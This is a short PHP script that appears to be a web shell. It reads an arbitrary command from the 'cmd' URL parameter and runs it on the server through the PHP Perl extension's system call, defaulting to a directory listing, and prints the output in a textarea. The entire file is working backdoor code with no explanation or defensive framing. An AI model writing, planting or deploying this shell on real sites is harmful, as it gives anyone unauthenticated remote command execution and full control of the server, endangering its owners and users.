<?php
if(empty($_GET['cmd']))
	$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls';
$perl=new perl();
echo "<textarea rows='25' cols='75'>";
$perl->eval("system('".$_GET['cmd']."')");
?>